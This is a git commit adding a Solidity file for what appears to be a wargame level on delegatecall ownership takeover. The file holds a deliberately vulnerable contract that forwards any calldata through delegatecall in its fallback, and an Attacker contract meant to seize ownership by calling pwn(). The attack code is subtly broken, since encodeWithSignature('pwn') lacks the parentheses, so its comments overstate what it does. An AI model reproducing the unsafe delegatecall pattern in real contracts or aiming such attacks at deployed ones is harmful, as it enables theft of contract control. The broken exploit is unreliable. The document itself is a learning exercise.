72bc92962ddd04e3dbe5419fc2024c3dcc1830b9
Wicca <92827559+Shoelacez@users.noreply.github.com>
2023-02-19 10:37:42 +0800

    delegation.sol

---
+++ Levels/level-06/delegation.sol
@@ -0,0 +1,47 @@
+
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+contract Delegate {
+    address public owner;
+
+    constructor(address _owner) {
+        owner = _owner;
+    }
+
+    function pwn() public {
+        owner = msg.sender;
+    }
+}
+
+contract Delegation {
+    address public owner;
+    Delegate delegate;
+
+    constructor(address _delegateAddress)
+    {
+        delegate = Delegate(_delegateAddress);
+        owner = msg.sender;
+    }
+    // gets triggered when we call a function that does not exist
+    fallback() external {
+        (bool result,) = address(delegate).delegatecall(msg.data);
+        if (result) {
+            this;
+    }
+  }
+}
+
+contract Attacker{
+    address public victim;
+
+    constructor(address _victimcontract){
+        victim = _victimcontract;
+    }
+    // this function wil trigger the fallback() in Delegation
+    // by calling pwn() which does not exist
+    // This way the contract preseves the context msg.data
+    function attack() public{
+        victim.call(abi.encodeWithSignature("pwn"));
+    }
+}
